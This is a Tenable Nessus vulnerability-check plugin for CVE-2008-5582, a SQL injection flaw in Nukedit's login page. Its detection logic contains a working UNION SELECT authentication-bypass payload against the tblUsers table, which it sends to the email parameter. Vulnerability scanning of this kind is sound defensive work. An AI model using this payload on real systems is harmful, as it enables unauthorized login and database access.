#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31192);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2008-5582");
  script_bugtraq_id(28009);
  script_osvdb_id(50063);
  script_xref(name:"EDB-ID", value:"5192");

  script_name(english:"Nukedit utilities/login.asp email Parameter SQL Injection");
  script_summary(english:"Tries to bypass authentication using SQL injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP script that is susceptible to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Nukedit, a content management system
written in ASP. 

The version of Nukedit installed on the remote host fails to sanitize
user input to the 'email' parameter of the 'utilities/login.asp'
script before using it in a database query.  An unauthenticated
attacker may be able to exploit this issue to manipulate database
queries to disclose sensitive information, bypass authentication, or
even attack the underlying database." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Nukedit 4.9.8 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/02/27");
 script_cvs_date("$Date: 2016/05/20 14:21:42 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning", "global_settings/supplied_logins_only");
  script_require_ports("Services/www", 80);
  script_require_keys("www/ASP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

port = get_http_port(default:80, embedded: 0);
if (!can_host_asp(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/nukedit", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the script exists.
  url = string(dir, "/utilities/login.asp");

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # If so...
  if (
    'ID="Form2" onsubmit="return Form_Validator' >< res ||
    "document.frmLogin.savepassword2.checked" >< res
  )
  {
    pass = "nessus";
    enc_pass = "ENC0f2cdc33b5be6fe0223bf9e93bba10f9474d8df35bf7d8551c86211dd31ba99e";
    uid = rand() % 0xff;
    gid = rand() % 0xff;

    exploit = string("' UNION SELECT ", uid, ",", gid, ",3,4,'", enc_pass, "',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 FROM tblUsers WHERE 'x'='x");

    postdata = string(
      "password=", pass, "&",
      "email=", urlencode(str:exploit)
    );

    w = http_send_recv3(method: "POST", port: port,
      item: strcat(url, "?redirect=", SCRIPT_NAME),
      content_type: "application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
    res = strcat(w[0], w[1], '\r\n', w[2]);

    # There's a problem if we're redirected or we see a database error.
    if (
      (
        string("utilities/refresh.asp?redirect=", SCRIPT_NAME) >< res &&
        string("userid=", uid, "; expires") >< res 
      ) ||
      (
        "Microsoft JET Database" >< res &&
        "selected tables or queries of a union query do not match" >< res
      )
    )
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
